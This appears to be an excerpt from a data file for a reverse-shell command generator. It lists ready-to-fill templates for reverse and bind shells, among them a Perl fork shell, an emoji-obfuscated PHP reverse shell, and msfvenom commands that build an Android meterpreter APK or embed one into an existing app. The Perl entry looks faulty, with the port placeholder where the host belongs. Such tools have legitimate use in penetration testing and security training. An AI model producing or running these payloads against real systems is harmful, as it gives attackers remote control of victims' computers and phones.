...
const reverseShellCommands = withCommandType(CommandType.ReverseShell, [
  {
    name: 'Bash -i',
  ...
  },
  {
    name: 'Perl no sh',
    command:
      'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{port}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'',
    meta: ['linux', 'mac'],
  },
  {
    name: 'PHP Emoji',
    command:
      'php -r \'$😀="1";$😁="2";$😅="3";$😆="4";$😉="5";$😊="6";$😎="7";$😍="8";$😚="9";$🙂="0";$🤢=" ";$🤓="<";$🤠=">";$😱="-";$😵="&";$🤩="i";$🤔=".";$🤨="/";$🥰="a";$😐="b";$😶="i";$🙄="h";$😂="c";$🤣="d";$😃="e";$😄="f";$😋="k";$😘="n";$😗="o";$😙="p";$🤗="s";$😑="x";$💀 = $😄. $🤗. $😗. $😂. $😋. $😗. $😙. $😃. $😘;$🚀 = "{ip}";$💻 = {port};$🐚 = "{shell}". $🤢. $😱. $🤩. $🤢. $🤓. $😵. $😅. $🤢. $🤠. $😵. $😅. $🤢. $😁. $🤠. $😵. $😅;$🤣 =  $💀($🚀,$💻);$👽 = $😃. $😑. $😃. $😂;$👽($🐚);\'',
    meta: ['linux', 'mac'],
  },
  {
...
const bindShellCommands = withCommandType(CommandType.BindShell, [
  {
    name: 'Python3 Bind',
    command:
...
const msfvenomCommands = withCommandType(CommandType.MSFVenom, [
  {
  ...
  },
  {
    ...
    command:
      'msfvenom –p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk',
    meta: ['msfvenom', 'android', 'android', 'reverse'],
  },
  {
    name: 'Android Meterpreter Embed Reverse TCP',
    command:
      'msfvenom -x <app.apk> android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk',
    meta: ['msfvenom', 'android', 'android', 'reverse'],
  },
  {
